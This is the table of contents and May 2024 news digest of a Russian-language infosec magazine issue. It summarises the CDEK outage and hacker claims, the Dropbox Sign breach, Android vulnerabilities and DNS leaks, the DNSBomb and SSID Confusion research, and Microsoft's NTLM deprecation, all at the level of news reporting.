
            № 302
CONTENTS


    MEGANews
  Самые важные события в мире инфосека за май

    PHDays Fest 2
  Как прошли четыре дня кибербеза для всех

    PHDays Fest 2
  Десять выступлений, записи которых стоит посмотреть

    Добиваем мониторинг
  Как работают продвинутые атаки на Sysmon

    Agent Tesla
  Учимся реверсить боевую малварь в Ghidra

    Нетипичная змея
  Реверсим приложение на Python c кастомным интерпретатором

    Уроки форензики
  Анализируем логи Windows и таблицу MFT на примере HTB Jinkies

   Дыры в openSIS
  Разбираем SQL-инъекции на живом примере

    Чит своими руками
  Обходим простой античит и исследуем игру на Unity

    HTB Napper
  Реверсим приложение на Go и пишем декриптор при помощи ChatGPT

    HTB Bizness
  Атакуем Apache OFBiz

    HTB Devvortex
  Повышаем привилегии через уязвимость в Apport

    HTB Monitored
   Получаем доступ в систему через Nagios XI

    Совершенно не секретно
  Как я искал утечки в сервисе для ИБ‑специалистов

    WinAPI днем и ночью
  Ищем способы обращения к нативному коду из C#

    Как дела в контейнере
  Собираем события безопасности в Docker

    Охлади себе всё
  Собираем контроллер оборотов для компьютерных кулеров

    Титры
  Кто делает этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: хакеры взломали Dropbox и предположи‐
тельно  атаковали СДЭК,  эксперты  сравнивают функцию
Recall в Windows с кейлоггером, атака DNSBomb усиливает
DDoS в 20 тысяч раз, разработчики Android борются с кра‐
жами устройств, завершается поддержка NTLM и другие
интересные события прошедшего мая.





АТАКА НА СДЭК
С 26 мая 2024 года в работе логистической компании СДЭК начались серь‐
езные перебои: не работали приложение и сайт СДЭК, компания не при‐
нимала и не выдавала отправления.
  В  компании  заверяли,  что все  посылки  «будут бережно  сохранены
и выданы после устранения технических проблем», а срок хранения в ПВЗ
при необходимости продлят.
    Хотя еще 26 мая представители СДЭК писали, что компания «находится
на заключительном этапе восстановления полной работоспособности» своих
сервисов, на деле работа стала частично возобновляться лишь 29 мая, когда
начали выдавать отправления, находящиеся в ПВЗ.
  В компании заявили, что причина происходящего — «обширный техничес‐
кий сбой», хакерская группа Head Mare заявила в X (бывший Twitter), что взло‐
мала СДЭК, зашифровала данные и уничтожила бэкапы.





В своем сообщении, к которому приложены скриншоты, предположительно
демонстрирующие внутренние системы СДЭК, хакеры писали, что якобы
зашифровали данные компании, а резервные копии «админы на маленькой зп
делали раз в полгода» и теперь бэкапы «пропали».





Группировка заявила, что «сисадмины оказались слишком слабы, а политики
безопасности не оправдали себя». Также злоумышленники «передали при‐
вет» российской компании по управлению цифровыми рисками BI.ZONE,
которая  консультирует СДЭК по  вопросам  кибербезопасности и софт
которой якобы бесполезен.
  При этом представители Роскомнадзора сообщили СМИ, что после пред‐
полагаемой атаки не получали от СДЭК уведомлений об утечке данных, хотя
оператор,    допустивший     утечку    персональных    данных,    обязан
в течение 24 часов уведомить об этом РКН.


КОЛИЧЕСТВО ПОЛЬЗОВАТЕЛЕЙ TOR СНИЖАЕТСЯ

Согласно официальной статистике Tor Project, за последний год количество пользователей бра‐
узера Tor в России сократилось до 48 тысяч, хотя еще в 2023 году составляло более
100 тысяч.





Эксперты связывают это сразу с несколькими причинами, включая отъезд активной аудитории
браузера за границу, смещение хакерской активности в Telegram, а также с блокировки Рос‐
комнадзора.





ВЗЛОМ DROPBOX
Хакеры проникли в производственные системы платформы Dropbox Sign
eSignature и получили доступ к токенам аутентификации, данным многофак‐
торной аутентификации (МФА), хешированным паролям и информации о кли‐
ентах.
   Dropbox Sign (ранее HelloSign) — это платформа электронной подписи,
позволяющая  клиентам  хранить,  отправлять и  подписывать  документы
онлайн, причем подписями, имеющими юридическую силу.
  В конце апреля 2024 года специалисты Dropbox обнаружили несанкциони‐
рованный доступ к производственным системам Dropbox Sign и начали рас‐
следование. Оказалось, злоумышленники каким‑то образом получили доступ
к автоматизированному инструменту для настройки системы Dropbox Sign,
который является частью бэкенд‑сервисов платформы.
  С помощью  этого  инструмента хакеры смогли запускать приложения
и автоматизированные сервисы с повышенными привилегиями, что поз‐
волило им добраться до базы данных клиентов.


      «В ходе дальнейшего расследования мы обнаружили, что злоумыш-
       ленники получили доступ к данным, в том числе информации о кли-«
      ентах Dropbox Sign, включая адреса электронной почты, имена поль-
       зователей, номера телефонов и хешированные пароли, а также общие
       настройки аккаунтов и некоторые аутентификационные данные (такие
       как ключи API, токены OAuth и МФА)», — сообщают в Dropbox.                »
Отмечается, что люди, которые пользовались платформой Dropbox Sign
eSignature, но не создавали аккаунт, тоже пострадали, но в их случае утекли
только адреса электронной почты и имена.
  По заявлению компании, она не обнаружила никаких доказательств того,
что злоумышленники получили доступ к документам, соглашениям или пла‐
тежной информации клиентов или имели доступ к системам других сервисов
компании. Подчеркивается, что «инфраструктура Dropbox Sign в значительной
степени отделена от других сервисов Dropbox».
  В итоге Dropbox сбросила пароли всех пользователей, завершила все
сеансы Dropbox Sign и ограничила использование API-ключей до тех пор,
пока клиенты их не заменят. Пользователям Dropbox Sign рекомендуется
остерегаться возможных фишинговых кампаний, которые могут использовать
украденные данные для сбора конфиденциальной информации (например,
паролей).


РЫНОК ОНЛАЙН-ПИРАТСТВА СОКРАТИЛСЯ НА 16%

По данным компании FACCT, рынок онлайн‑пиратства в России в 2023 году оценивался
в 38 миллионов долларов США. Для сравнения: в 2018 году объем рынка нелегального виде‐
оконтента составлял 87 миллионов долларов США.

За год нелегальные распространители видеоконтента недосчитались 16% своих доходов, тогда
как количество пиратских доменов увеличилось на 16%.

В 2023 году было обнаружено 80 тысяч пиратских доменов с русскоязычным видеокон‐
тентом, что на 11 тысяч (16%) больше по сравнению с 2022 годом. Исследователи связывают
это с технологиями автоматизации, использованием пиратами динамически изменяющихся
зеркал, которые позволяют им дольше оставаться в поисковой выдаче.





В целом пиратский контент был размещен на сайтах в 82% случаев, в социальных сетях и мес‐
сенджерах — в 12%, а в 6% случаев был загружен на видеохостинги.

Доходы пиратов от рекламы за прошлый год тоже упали: средний CPM (cost per mille, цена
за 1000 показов в рекламной кампании) составил 3,13 доллара, что на 6% меньше, чем
в 2022 году.





МНОГОЧИСЛЕННЫЕ
ПРОБЛЕМЫ XIAOMI
Исследователи из компании Oversecured выявили многочисленные уязвимос‐
ти в приложениях и системных компонентах устройств Xiaomi и Google,
работающих под управлением Android. Эти баги дают доступ к произвольным
операциям, ресиверам и сервисам с системными привилегиями, чреваты
кражей произвольных файлов, а также утечкой данных устройства, настроек
и учетной записи.


Xiaomi
В Oversecured сообщают, что 20 уязвимостей затрагивают различные при‐
ложения и компоненты Xiaomi, включая:
 • Gallery (com.miui.gallery);
 • GetApps (com.xiaomi.mipicks);
 • Mi Video (com.miui.videoplayer);
 • MIUI Bluetooth (com.xiaomi.bluetooth);
 • Phone Services (com.android.phone);
 • Print Spooler (com.android.printspooler);
 • Security (com.miui.securitycenter);
 • Security Core Component (com.miui.securitycore);
 • Settings (com.android.settings);
 • ShareMe (com.xiaomi.midrop);
 • System Tracing (com.android.traceur);
 • Xiaomi Cloud (com.miui.cloudservice).

Отмечается, что Phone Services, Print Spooler, Settings и System Tracing —
легитимные компоненты из Android Open Source Project (AOSP), но они были
модифицированы китайским производителем для добавления дополнитель‐
ной функциональности, что и привело к появлению обнаруженных недос‐
татков.
   Среди наиболее значимых проблем, найденных исследователями, можно
отметить  инъекцию  шелл‑команд,  затрагивающую  приложение  System
Tracing, и ошибки в приложении Settings, которые могли привести к хищению
произвольных файлов, а также утечке через намерения (intent) информации
об устройствах Bluetooth, подключенных сетях Wi-Fi и экстренных контактах.
   Также был обнаружен баг, связанный с повреждением памяти в приложе‐
нии GetApps, которое, в свою очередь, берет начало от Android-библиотеки
LiveEventBus. По словам Oversecured, сопровождающим проекта сообщили
о проблеме больше года назад, однако она до сих пор не устранена.
   Исследователи  уведомили  Xiaomi  об  уязвимостях  в  конце  апре‐
ля 2023 года, и к настоящему времени все проблемы устранены. Теперь
пользователям  рекомендуется как можно  скорее  установить последние
обновления для защиты от потенциальных рисков.


Google
Интересно, что, помимо перечисленного, эксперты нашли еще шесть уяз‐
вимостей в ОС Google в целом. Две из них характерны для устройств Pixel,
а остальные четыре затрагивают любые Android-устройства. Однако все упо‐
минания Google были удалены из отчета из‑за того, что как минимум одна
из уязвимостей до сих пор не исправлена.
   Google тоже столкнулась с проблемами после модификации кода AOSP.
Так, приложение Settings в смартфонах Pixel использовало незадеклариро‐
ванные разрешения при добавлении компонентов в файл AndroidManifest.xml.
Это «позволяет злоумышленнику изменить списки операторских приложений
и приложений для обхода VPN». В Oversecured подчеркивают, что только сис‐
темные приложения могут избегать VPN таким образом.


      «Это очень характерно для Android. На самом деле огромное заб-
       луждение, что Android — операционная система с открытым исходным«
      кодом. Да, часть кода находится в открытом доступе, но даже Google
      не использует AOSP в первоначальном виде и модифицирует его
      для  выпуска  своих  устройств. Я бы  сказал,  что  устройства  Pixel
      на 50% используют AOSP, а остальное — закрытый код. Для остальных
       производителей Android этот процент меньше», — рассказывает глава
      Oversecured Сергей Тошин.                »
В итоге проблемы, связанные с Google и Pixel, выглядят следующим образом:
 • CVE-2024-0017, исправлена 20 декабря 2023 года — способ получить дос‐
   туп к геолокации пользователя через камеру;
 • CVE нет, обнаружена 4 ноября 2023 года — способ доступа к произволь‐
  ным файлам через функцию выбора файлов в компонентах WebView;
 • CVE нет, исправлена в Pixel в декабре 2023 года — дефект приложения
   Settings, позволяющий добавлять системные приложения в список обхода
   VPN;
 • CVE нет, обнаружена 18 августа 2022 года — некорректная проверка при‐
   вилегий Bluetooth;
 • CVE-2023-20963, обнаружена 17 февраля 2022 года, исправлена 1 мар‐
   та 2023 года — уязвимость, позволявшая получить доступ к произвольным
   компонентам произвольных приложений, установленных на устройстве;
 • CVE-2021-0600,   обнаружена   29   января   2021   года,   исправ‐
   лена 24 июня 2021 года — уязвимость HTML-инъекций в приложении
   Settings на экране запроса администратора устройства.

При этом проблема CVE-2023-20963 активно эксплуатировалась хакерами
с 4 марта 2022 года (атаки начались через две недели после того, как о ней
уведомили Google). В Oversecured заявляют, что исправление этой уязвимос‐
ти не должно было занять у Google так много времени. Ведь Google узнала
о баге еще в 2022 году, но не предпринимала никаких действий около года.

      «Если бы  они  исправили  parcel/unparcel-уязвимость  сразу  после
      нашего предупреждения 17 февраля 2022 года, то Pinduoduo не под-«
       верглось бы атаке, — писали исследователи в своем отчете, упоминая
       китайское приложение Pinduoduo для Android, которое было удалено
      из Google Play Store в 2023 году из‑за уязвимости перед CVE-2023-
      20963. — Однако Google начала работу над исправлением более чем
      через год, только когда стало известно об атаках. В итоге проблему
      исправили 1 марта 2023 года. Мы уважаем инженеров Google, но,
        очевидно, их подход к безопасности нуждается в пересмотре».                »
В ответ на это представители Google заявили, что, хотя в компании стремятся
сделать процесс выпуска и установки патчей более быстрым, «в некоторых
случаях действительно может потребоваться больше времени, чтобы убе‐
диться, что патч готов к внедрению в экосистему».





ТРАМП ПООБЕЩАЛ ПОМИЛОВАТЬ РОССА УЛЬБРИХТА
Во время выступления на Либертарианском национальном конгрессе в Вашингтоне Дональд
Трамп заявил, что, если его вновь изберут президентом США, он отменит пожизненное зак‐
лючение основателя Silk Road Росса Ульбрихта.
    Заявление Трампа вызвало аплодисменты  собравшихся, многие из которых держали
в руках таблички с надписью «Free Ross».

          «Если вы проголосуете за меня, в первый же день я заменю приговор Россу→        Ульбрихту уже отбытым сроком. Он уже отсидел одиннадцать лет, мы вернем
       его домой».


За несколько часов до этого Трамп сделал еще одно заявление в социальной сети Truth Social,
созданной Trump Media & Technology Group (TMTG) в 2022 году.

         «Я очень позитивно и открыто отношусь к криптовалютным компаниям и все‐→       му, что связано с этой новой и бурно развивающейся индустрией. Наша страна
       должна быть лидером в этой области. Второго места быть не может, — написал
      Трамп и добавил: — Президент Джо Байден хочет, чтобы (криптовалютная
        индустрия) умерла медленной и мучительной смертью, но со мной этого никог‐
       да не случится!»





ANDROID СЛИВАЕТ
DNS-ЗАПРОСЫ
Пользователь Mullvad VPN обнаружил и сообщил, что Android-устройства рас‐
крывают DNS-запросы при переключении VPN-серверов, даже если функция
Always-on VPN  включена  с помощью опции  «Блокировать  соединения
без VPN».
   Функция Always-on VPN предназначена для запуска VPN-сервиса сразу
при загрузке устройства и поддержания его в рабочем состоянии, пока
устройство или профиль активны. В свою очередь, включение опции «Бло‐
кировать соединения без VPN» (Block connections without VPN) гарантирует,
что весь сетевой трафик проходит только через подключенный VPN-туннель.
   Однако,  изучая  упомянутое  сообщение  пользователя,  разработчики
Mullvad пришли к выводу, что в Android существует баг, который приводит
к утечке DNS-информации, даже если перечисленные функции включены
и устройство работает под управлением новейшей версии ОС (Android 14).
   Ошибка возникает при использовании приложений, которые напрямую
обращаются к C-функции getaddrinfo, обеспечивающей независимую от про‐
токола трансляцию текстового имени хоста для IP-адреса. Оказалось, что
в Android происходит утечка DNS-трафика, когда VPN активен (но не настроен
DNS-сервер) или если VPN-приложение переконфигурирует туннель, но про‐
исходит сбой или вынужденная приостановка работы.


     «Мы не обнаружили утечек из приложений, которые используют толь-
      ко API Android (например, DnsResolver). Браузер Chrome служит при-«
     мером  приложения, которое может  использовать  getaddrinfo  нап-
      рямую, — пишут разработчики Mullvad. — Вышеописанное применя-
      ется независимо от того, включены ли функции Always-on VPN и Block
       connections without VPN, что не является ожидаемым поведением ОС
       и, следовательно, должно быть исправлено».                »
Эксперты сообщили, что первый сценарий DNS-утечки — это ситуация, когда
пользователь переключается на другой сервер или меняет DNS-сервер.
Такую  угрозу можно  легко устранить,  настроив фальшивый DNS-сервер
во время работы VPN-приложения.
   Однако справиться с утечкой DNS-запросов при повторном подключении
VPN-туннеля уже не так просто. Причем эта проблема актуальна не только
для Mullvad, но и для любых других VPN-приложений для Android.

       «Следует четко понимать, что подобные способы решения проблем
      не должны использоваться ни в одном VPN-приложении. Также неп-«
       равильно, если приложение использует getaddrinfo для резолвинга
      доменных имен. Такие проблемы должны быть решены на уровне ОС,
       чтобы защитить всех  пользователей  Android, независимо от  того,
      какие приложения они используют», — резюмируют в Mullvad.                »
Представители Google уже сообщили, что знают об обнаруженной проблеме
и изучают результаты изысканий разработчиков Mullvad.
   Нужно отметить, что в 2022 году специалисты Mullvad уже находили по‐
хожую проблему в Android. Тогда выяснилось, что трафик утекает за пределы
VPN-туннелей, когда устройство подключается к сети Wi-Fi. Это тоже про‐
исходило даже в том случае, если функции Block connections without VPN
или Always-on VPN были активны.


КИРИЛЛИЧЕСКОМУ ДОМЕНУ .РФ ИСПОЛНИЛОСЬ 14 ЛЕТ
Домен .РФ был делегирован России в 2010 году и стал первым в мире кириллическим
доменом. В мае 2024 года .РФ исполнилось 14 лет, и на сегодняшний день в нем зарегистри‐
ровано 778 000 имен.

Зона .РФ остается самой крупной кириллической доменной зоной. Так, только за 2023 год она
выросла сразу на 92 769 доменных имен (13,7%).





DDOS ЧЕРЕЗ
DNSBOMB
Группа ученых из Университета Цинхуа (Китай) рассказала о новом методе
DDoS-атак, который получил название DNSBomb. Для организации мощных
DDoS-атак в данном случае используется DNS-трафик.
   Фактически DNSBomb представляет собой новую вариацию атаки двад‐
цатилетней давности: еще в 2003 году было опубликовано исследование,
в котором описывалась DDoS-атака с использованием TCP-пульсации (TCP
pulses).
   Такие атаки используют повторяющиеся короткие всплески больших объ‐
емов трафика для воздействия на целевую систему или сервис. Подобные
импульсы могут длиться до нескольких сотен миллисекунд с периодичностью
раз в несколько секунд, а атака в целом может продолжаться несколько часов
или дней. Считается, что пульсирующие DDoS-атаки сложнее обнаружить.
  DNSBomb использует тот же подход, но в другой реализации: эксплуати‐
рует DNS-софт и современную инфраструктуру DNS-серверов,  включая
рекурсивные резолверы и авторитетные nameserver’ы.


                                     Продолжение статьи →
← Начало статьи





                                Общая схема атаки

  В сущности, DNSBomb работает путем отправки медленного потока спе‐
   циально подготовленных DNS-запросов на DNS-серверы, которые пересы‐
  лают данные, наращивают размеры пакетов и накапливают их, чтобы потом
   выпустить все сразу в виде мощного импульса DNS-трафика, направленного
   прямо на цель.
    В рамках тестов эксперты использовали DNSBomb против десяти рас‐
   пространенных DNS-программ и 46 публичных DNS-сервисов и добились
   атаки мощностью до 8,7 Гбит/с. При этом исходный DNS-трафик был усилен
   в 20 тысяч раз от своего первоначального размера.





  В итоге атака приводит к полной потере пакетов или ухудшению качества
   обслуживания как на соединениях без сохранения состояния, так и с сох‐
   ранением (TCP, UDP и QUIC).


       «Мы пришли к выводу, что любая система или механизм, способный
          объединять что‑либо (например, DNS и CDN), может использоваться «
         для создания пульсирующего DoS-трафика», — пишут авторы иссле-
          дования.                 »
   Ученые сообщили, что уведомили о проблеме все затронутые стороны.
  Все 24 организации работают над исправлениями или уже выпустили патчи.
  При этом среди пострадавших организаций числятся наиболее известные
   DNS-провайдеры мира.
     Проблеме DNSBomb был присвоен основной CVE-идентификатор CVE-
  2024-33655, а также ряд других идентификаторов, связанных с конкретными
  DNS-решениями:
   • Knot: CVE-2023-49206;
   • Simple DNS Plus: CVE-2023-49205;
   • Technitium: CVE-2023-28456, CVE-2023-49203;
   • MaraDNS: CVE-2023-49204;
   • Dnsmasq: CVE-2023-28450, CVE-2023-49207;
   • CoreDNS: CVE-2023-28454, CVE-2023-49202;
   • SDNS: CVE-2023-49201.


 ИНФОСТИЛЕРЫ ЗАРАЗИЛИ 10 МИЛЛИОНОВ СИСТЕМ

   Специалисты «Лаборатории Касперского» подсчитали, что в прошлом году больше половины
    атакованных стилерами устройств (55%) в мире было заражено малварью RedLine. Суммарно
   в 2023 году от инфостилеров пострадали около 10 миллионов систем, а количество зараже‐
   ний с 2022 по 2023 год возросло на 35%.





    - В общей сложности в период с 2020 по 2023 год эксперты обнаружили более 100 видов
   инфостилеров. При этом с 2021 по 2023 год доля атак с помощью новых семейств такой мал‐
   вари выросла с 4 до 28%. - Упомянутый выше стилер RedLine использовался в 51% случаев
   заражения устройств стилерами. За ним следуют Vidar (17%) и Raccoon (около 12%).





 ПРОБЛЕМА SSID
 CONFUSION
   Обнаружена уязвимость, связанная с конструктивными недостатками стан‐
  дарта Wi-Fi IEEE 802.11. Проблема позволяет обманом вынудить жертву под‐
   ключиться к менее защищенной беспроводной сети и прослушивать сетевой
   трафик пользователя.
     Баг получил название SSID Confusion и идентификатор CVE-2023-52424.
  Он затрагивает все операционные системы и Wi-Fi-клиенты, включая домаш‐
  ние и mesh-сети, основанные на протоколах WEP, WPA3, 802.11X/EAP и AMPE.
     Суть атаки заключается в том, чтобы «вынудить жертву осуществить даун‐
  грейд и переключиться на менее защищенную сеть, подменив имя доверен‐
  ной сети (SSID), чтобы перехватить трафик или осуществить дальнейшие ата‐
   ки», — говорится в докладе компании Top10VPN, созданном в сотрудничестве
  с профессором и известным ИБ‑исследователем из Лёвенского католичес‐
   кого университета Мэти Ванхофом (Mathy Vanhoef).


          «Также успешная атака SSID Confusion заставляет любой VPN с фун-
          кцией автоматического отключения в доверенных сетях отключиться, «
         оставляя трафик жертвы незащищенным», — добавляют эксперты.                 »
   Проблема, лежащая в основе этой атаки, состоит в том, что стандарт Wi-Fi
  не требует, чтобы SSID всегда проходил аутентификацию, это обязательно
  лишь  тогда,  когда  устройство  присоединяется  к  определенной  сети.
  В результате злоумышленник может обманом заставить пользователя под‐
   ключиться к недоверенной сети Wi-Fi, а не к той, к которой тот собирался под‐
   ключиться  изначально,  осуществив  атаку типа  «противник  посередине»
   (adversary in the middle, AitM).





        «В нашей атаке, когда жертва хочет подключиться к сети TrustedNet,
       мы обманом вынуждаем ее подключиться к другой сети — WrongNet, «
         которая  использует  аналогичные  учетные  данные, —  рассказали
          исследователи. — В результате клиент жертвы будет думать и показы-
         вать пользователю, что тот подключен к TrustedNet, хотя на самом
        деле он подключен к WrongNet».                 »
   Другими словами, даже если пароли и другие учетные данные проходят вза‐
  имную верификацию при подключении к защищенной сети Wi-Fi, нет никакой
   гарантии того, что пользователь подключился именно к той сети, к которой
   собирался.
     Для реализации атаки SSID Confusion должны быть соблюдены следующие
   условия:
   • жертва собирается подключиться к доверенной сети Wi-Fi;
   • жертве доступна мошенническая сеть с теми же учетными данными
     для аутентификации, что и настоящая;
   • злоумышленник находится в положении, позволяющем осуществить AitM-
       атаку между жертвой и доверенной сетью.

  Для защиты от SSID Confusion исследователи предлагают обновить стандарт
   Wi-Fi 802.11, включив SSID в четырехсторонний хендшейк, который исполь‐
   зуется при подключении к защищенным сетям, а также усовершенствовать
  защиту маяков (beacon), чтобы «клиент мог хранить эталонный маяк, содер‐
  жащий SSID сети, и проверять его подлинность во время четырехстороннего
   хендшейка».
      Маяки представляют собой управляющие фреймы, которые периодически
   посылают точки беспроводного доступа, чтобы сообщить о своем присутс‐
   твии. В них содержится информация об SSID, возможностях сети и так далее.

         «Сети могут защититься от такой атаки, избегая повторного исполь-
         зования  учетных данных в разных SSID, — добавляют исследова- «
          тели. — В  корпоративных  сетях  следует  использовать  отдельные
       CommonNames сервера RADIUS, а в домашних сетях — уникальный
         пароль для каждого SSID».                 »





   Мэтт Линтон (Matt Linton), возглавляющий подразделение Google по реагированию на угрозы
   и управлению инцидентами, опубликовал в  блоге сообщение, в котором  рассказал, что
   в текущем виде фишинговые проверки и учения лишь заставляют его коллег ненавидеть
   ИТ‑команды, но не приносят никакой пользы.
      По его словам, «нет никаких доказательств, что эти проверки вообще приводят к умень‐
   шению количества успешных фишинговых кампаний». Лишь увеличивается нагрузка на спе‐
   циалистов по реагированию на инциденты и тех, кому поручено обрабатывать отчеты, а сот‐
   рудники чувствуют себя обманутыми.

              «Обучение сотрудников тому, как оповещать службы безопасности о готовя‐ →           щихся атаках, по‑прежнему является ценным и важным дополнением к ком‐
          плексной системе безопасности. Однако не нужно превращать это в противос‐
          тояние. Мы ничего не выиграем, если будем „ловить“ людей, которые не справ‐
           ляются с этой задачей.
                Давайте перестанем заниматься старыми и неработающими средствами
         защиты и последуем примеру более зрелых отраслей, таких как пожарная
           безопасность, которые уже сталкивались с подобными проблемами и вырабо‐
          тали сбалансированный подход.
             Фишинг и социальная инженерия не исчезнут как методы атак. До тех пор
          пока люди будут оставаться нестабильными и социальными существами, у зло‐
           умышленников будут способы манипулировать человеческим фактором.
              Более эффективным подходом к рискам будет целенаправленное стрем‐
          ление к созданию систем, защищенных по умолчанию в долгосрочной перспек‐
           тиве. А также инвестиции в инженерные средства защиты, включая учетные
           данные, не поддающиеся фишингу (такие как passkey), и внедрение многос‐
           тороннего подтверждения для важных аспектов безопасности в производствен‐
         ных системах. Считается, что именно благодаря инвестициям в подобные архи‐
           тектурные средства защиты Google уже почти десять лет не приходится всерьез
            беспокоиться о фишинге паролей», — пишет Линтон.


   У пожарных он предлагает перенять опыт проведения учений, когда проверка проводится
   не тайно, а факт ее проведения всем очевиден (к примеру, в жилых домах и офисных зданиях
   заранее расклеивают информационные плакаты). То есть фишинговые учения должны прямо
   сообщать, что это проверка, а также информировать участвующих в ней людей о преимущес‐
    твах.





 ANDROID ПРОТИВ
 ВОРОВ
  Google анонсировала ряд новых функций для Android, которые призваны
  защитить устройства от кражи и потери данных. Некоторые из них будут дос‐
  тупны только для устройств на базе Android 15 и выше, но другие планируется
   распространить на миллиарды устройств под управлением Android 10 и более
   старых версий.
      Чтобы защитить личные и конфиденциальные данные  пользователей
   в случае кражи или потери устройства, новая автоматическая блокировка
   экрана на основе ИИ и акселерометров, получившая название Theft Detection
   Lock,  заблокирует экран, если обнаружит  резкое  движение,  связанное
  с попыткой кражи (например, когда воры выхватывают устройство из рук вла‐
   дельца).
      Чтобы воры не смогли получить доступ к конфиденциальным данным
  и приложениям, еще одна новая функция, Offline Device Lock, автоматически
   блокирует устройство сразу после того, как вор отключит его от сети,
  или если система заметит много неудачных попыток аутентификации.
      Также Google анонсировала функцию Remote Lock, которая поможет
  людям, чьи устройства на базе Android уже были украдены. Remote Lock поз‐
   воляет удаленно заблокировать смартфон или планшет, используя только
  номер телефона и простую защитную задачу.





         «Это даст вам время на восстановление учетных данных, а также дос-
          туп к дополнительным полезным опциям Find My Device, включая «
          отправку команды полного сброса к заводским настройкам, чтобы
         полностью очистить устройство», — объясняет вице‑президент Google
         Сюзанна Фрей (Suzanne Frey).                 »
   Ожидается, что функции Theft Detection Lock, Offline Device Lock и Remote
  Lock будут доступны на устройствах под управлением Android 10 или выше
  через обновление сервисов Google Play, которое появится позже в текущем
   году.
     Кроме того, новый Android 15 также получит усовершенствованную защиту
   от сброса до заводских настроек, что сделает продажу украденных устройств
  очень сложной задачей, поскольку в процессе их настройки потребуется
   ввести учетные данные от аккаунта Google.

          «Благодаря этому обновлению, если вор принудительно сбросит нас-
          тройки украденного устройства, он не сможет настроить его заново, «
        не зная учетных данных устройства или аккаунта Google. Таким обра-
         зом, украденное устройство станет непригодным для продажи, что
         уменьшит привлекательность кражи телефонов», — добавляет Фрей.                 »
   Также обновленный Android потребует ввода PIN-кода, пароля или биомет‐
   рической аутентификации при попытке получить доступ или изменить важные
   настройки аккаунта Google и устройства из недоверенного места (например,
  при попытке изменения PIN-кода, доступа к Passkeys или отключения защиты
   от кражи).
      Аналогично для отключения функции Find My Device или продления
   тайм‑аута  экрана  устройства тоже  потребуется  ввести PIN-код, пароль
  или  использовать  какую‑либо  форму  биометрической  аутентификации.
  Это  должно  добавить  дополнительный  уровень  защиты,  призванный
  помешать злоумышленникам, укравшим устройство, сохранить его «разбло‐
   кированным или не отслеживаемым в интернете».
      Ожидается, что в новой версии Android этой осенью также появятся прос‐
   транства Private Space, которые можно будет заблокировать с помощью PIN-
  кода и предотвратить доступ воров к конфиденциальным данным, хранящим‐
  ся в определенных приложениях (например, к медицинской и финансовой
   информации).


  25 000 ЗАПРОСОВ НА УДАЛЕНИЕ КОНТЕНТА

   Компания  Google  опубликовала  ежегодный  отчет  о  прозрачности  за  вторую  полови‐
   ну 2023 года. В общей сложности компания получила 43 554 запроса по всему миру в период
   с июля по декабрь прошлого года. Из них 25 925 запросов на удаление контента исходили
   из России.

  25 607 запросов поступило от Роскомнадзора, еще 16 были распоряжениями суда, направлен‐
   ными в адрес Google, и 290 — распоряжения суда в адрес третьей стороны.

   Среди причин запросов лидировали национальная безопасность (10 704 запроса), авторские
    права (7471) и контент, связанный с наркотиками (1691).





 ЗАВЕРШАЕТСЯ
 ПОДДЕРЖКА NTLM
   Компания Microsoft подтвердила свои планы отказаться от NT LAN Manager
   (NTLM). В Windows 11 отказ запланирован уже на вторую половину текущего
   года. Также компания анонсировала ряд новых защитных мер, направленных
  на усиление безопасности ОС.
      Напомним, что Microsoft впервые заявила о своем решении отказаться
   от NTLM в пользу Kerberos в октябре 2023 года.
      Дело в том, что NTLM представляет собой созданное еще в девяностых
   семейство протоколов, которые используются для аутентификации удаленных
   пользователей и обеспечения безопасности сеансов. Kerberos — протокол
   аутентификации, много лет назад пришедший на смену NTLM, — теперь явля‐
   ется протоколом аутентификации по умолчанию во всех версиях Windows
  новее Windows 2000. Однако NTLM тоже применяется по сей день, и, если
  по какой‑либо причине работа Kerberos невозможна, вместо него будет
   использован NTLM.
    При этом различные NTLM-атаки — большая проблема, с которой
   Microsoft старается бороться, но NTLM по‑прежнему часто используется
  на серверах Windows, что позволяет хакерам успешно эксплуатировать такие
   уязвимости, как ShadowCoerce, PetitPotam, RemotePotato0.
    С 2010 года Microsoft призывает разработчиков отказаться от NTLM в сво‐
   их приложениях и советует администраторам либо отключать NTLM вовсе,
  либо настраивать свои серверы для блокировки атак NTLM relay с помощью
   Active Directory Certificate Services (AD CS).

         «Отказ от NTLM был большой просьбой со стороны ИБ‑сообщества,
           поскольку это позволит усилить аутентификацию пользователей. Отказ «
         от NTLM запланирован на вторую половину 2024 года», — заявили
         теперь в компании.                 »
   Среди других изменений в Windows 11 можно отметить:
   • активацию защиты Local Security Authority (LSA) по умолчанию для всех
     новых потребительских устройств;
   • использование безопасности на основе виртуализации (VBS) для защиты
     Windows Hello;
   • систему Smart App  Control, защищающую  пользователей от  запуска
      недоверенных или неподписанных приложений, которую теперь оснастят
     ИИ, и он поможет определять безопасность приложений и блокировать
      неизвестные или содержащие вредоносное ПО;
   • дополнение к Smart App Control — новое комплексное решение Trusted
      Signing, позволяющее разработчикам подписывать свои приложения и в
     целом упрощающее процесс подписания.

  В этом месяце Microsoft  рассказала и о  других  улучшениях в области
   безопасности. Например, изоляции приложений Win32, которая призвана
   предотвратить риски на случай компрометации приложения и создать барьер
   между приложением и ОС.
      Также сообщается, что будут ограничены злоупотребления привилегиями
   администратора, так как у пользователей станут запрашивать для этого явное
   разрешение. Появятся и VBS-анклавы для сторонних разработчиков, пред‐
   назначенные для создания доверенных сред выполнения.
     Кроме того, в будущем режимом печати по умолчанию станет Windows
   Protected Print Mode (WPP), который был представлен в декабре 2023 года.
  Он будет использоваться для борьбы с рисками, которые создает привиле‐
   гированный процесс Spooler, а также для защиты стека печати.
     Идея заключается в том, чтобы запускать Print Spooler как ограниченную
   службу и  резко  снизить его  привлекательность для  злоумышленников,
  которые зачастую злоупотребляют им для получения повышенных привилегий
   в Windows.
      Также сообщается, что компания перестанет доверять аутентификацион‐
  ным TLS-сертификатам серверов с ключами RSA менее 2048 бит из‑за «прог‐
  ресса в вычислительной мощности и криптоанализе».
      Завершает список новых функций система Zero Trust Domain Name System
  (ZTDNS), которая призвана помочь коммерческим клиентам изолировать
  Windows в своих сетях, ограничивая устройства под управлением ОС подклю‐
   чением только к утвержденным адресам по доменному имени.


  ВЕБ-СТРАНИЦЫ ПРОПАДАЮТ ИЗ СЕТИ

    Аналитики исследовательского центра Pew Research Center заметили, что фраза «интернет все
   помнит» не совсем соответствует действительности. Так, по состоянию на октябрь 2023 года
   четверть всех веб‑страниц, существовавших в период с 2013 по 2023 год, уже была недос‐
   тупна.

